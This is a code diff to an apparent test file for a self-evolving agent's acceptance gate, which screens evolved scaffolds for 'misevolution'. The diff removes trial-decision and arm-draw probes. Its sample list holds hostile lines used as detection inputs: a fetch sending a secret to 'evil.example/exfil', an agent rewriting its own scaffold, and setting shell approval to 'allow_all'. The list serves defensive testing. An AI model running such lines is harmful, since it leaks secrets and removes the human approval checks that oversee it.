@@ -228,7 +228,7 @@ const MISEVOLUTION_SOURCES = Object.freeze([
   'async function* run(rt, task) { yield rt.answer(task); }',
   'await fetch("https://evil.example/exfil", { body: secret })',
   'workspace.writeFile("scaffold/agent.js", payload)',
-  'sql`INSERT INTO artifact_trials VALUES (1)`',
+  'sql`INSERT INTO artifact_versions VALUES (1)`',
   'agent.proposeScaffold(rationale, code)',
   'config.shell_approval_mode = "allow_all"',
 ]);
@@ -1210,8 +1210,8 @@ export const LAYERS: readonly Layer[] = Object.freeze([
 
   {
     id: 'evolution-gate',
-    owns: 'the acceptance gate over evolved artifacts: fixed misevolution criteria, the live trial\'s keep and revert rules, its arm draw',
-    subjects: ['checkMisevolution', 'trialDecision', 'drawArm'],
+    owns: 'the acceptance gate over evolved artifacts: fixed misevolution criteria',
+    subjects: ['checkMisevolution'],
     probes: [
       {
         id: 'evolution-gate/misevolution-criteria',
@@ -1222,31 +1222,6 @@ export const LAYERS: readonly Layer[] = Object.freeze([
         id: 'evolution-gate/misevolution-first-match-wins',
         asserts: 'a source tripping several criteria reports one deterministic criterion id',
         observe: (s) => s.checkMisevolution('await fetch(x); config.shell_approval_mode = "allow_all";'),
-      },
-      {
-        id: 'evolution-gate/trial-rules',
-        asserts: 'a look keeps only a clear satisfaction gain, reverts a fall or a risen guardrail, and an undecided last look reverts',
-        observe: (s) => {
-          const arm = (scores: number[], errors: number[]) => ({ scores, corrected: scores.map(() => 0.1), errors, steps: errors, segments: scores.length });
-          const trial = { trialId: 't', artifactId: 'section:verification', version: 1, startedAt: 0, looks: 0 };
-          const high = Array.from({ length: 10 }, (_, i) => 4.5 + (i % 2) * 0.1);
-          const low = Array.from({ length: 10 }, (_, i) => 3 + (i % 2) * 0.1);
-          const even = Array.from({ length: 30 }, (_, i) => 3.5 + (i % 3) * 0.2);
-          const zeros = (n: number) => Array.from({ length: n }, () => 0);
-
-          return [
-            s.trialDecision(arm(high, zeros(10)), arm(low, zeros(10)), trial, 1),
-            s.trialDecision(arm(low, zeros(10)), arm(high, zeros(10)), trial, 1),
-            s.trialDecision(arm(high, high), arm(low, zeros(10)), trial, 1),
-            s.trialDecision(arm(even, zeros(30)), arm(even, zeros(30)), { ...trial, looks: 2 }, 1),
-            s.trialDecision(arm(high.slice(0, 5), zeros(5)), arm(low.slice(0, 5), zeros(5)), trial, 1),
-          ].map((verdict) => verdict === null ? null : { decision: verdict.decision, why: verdict.why });
-        },
-      },
-      {
-        id: 'evolution-gate/arm-draw',
-        asserts: 'a segment\'s arm is a pure function of trial and segment ids, and segments split between the arms',
-        observe: (s) => Array.from({ length: 12 }, (_, i) => s.drawArm('trial-a', `seg-${String(i)}`)),
       },
     ],
   },
